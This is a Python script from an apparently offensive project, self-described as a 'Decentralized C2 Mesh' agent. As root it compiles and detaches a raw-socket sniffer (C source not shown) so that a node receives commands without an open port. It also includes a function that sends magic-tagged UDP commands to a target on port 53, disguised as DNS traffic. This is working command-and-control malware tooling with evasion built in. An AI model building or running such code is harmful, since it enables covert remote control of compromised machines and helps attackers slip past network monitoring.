#!/home/dan/Chimera_Project/venv/bin/python3
import os
import subprocess
import socket
import sys

class MeshListener:
    """
    Agent 503: Decentralized C2 Mesh.
    Compiles the raw socket sniffer to allow the node to receive 
    commands from peers without exposing an open port.
    """
    def execute(self):
        src = "/home/dan/Chimera_Project/agents/503_Mesh_Listener/src/mesh_node.c"
        bin_out = "/home/dan/Chimera_Project/agents/503_Mesh_Listener/src/mesh_node"
        
        # Compile
        subprocess.run(["gcc", src, "-o", bin_out], check=True)
        
        if os.getuid() != 0:
            print("[!] Critical: Raw socket sniffing requires Root.")
            return
            
        # Execute in background (detach from terminal)
        subprocess.Popen([bin_out], stdout=sys.stdout, stderr=sys.stderr)

    def send_swarm_command(self, target_ip, command):
        """Actionable testing function to wake the node."""
        magic = b"CHMR99"
        payload = magic + command.encode()
        
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # We can send it to ANY UDP port, because the raw socket sniffs all of them.
        # Sending to port 53 (DNS) makes it look like standard traffic.
        s.sendto(payload, (target_ip, 53))
        print(f"[*] Broadcasted Swarm Command to {target_ip}: {command}")
        s.close()

if __name__ == "__main__":
    ml = MeshListener()
    
    if len(sys.argv) > 1 and sys.argv[1] == "--wake":
        if len(sys.argv) != 4:
            print("Usage: ./main.py --wake <target_ip> '<command>'")
        else:
            ml.send_swarm_command(sys.argv[2], sys.argv[3])
    else:
        ml.execute()
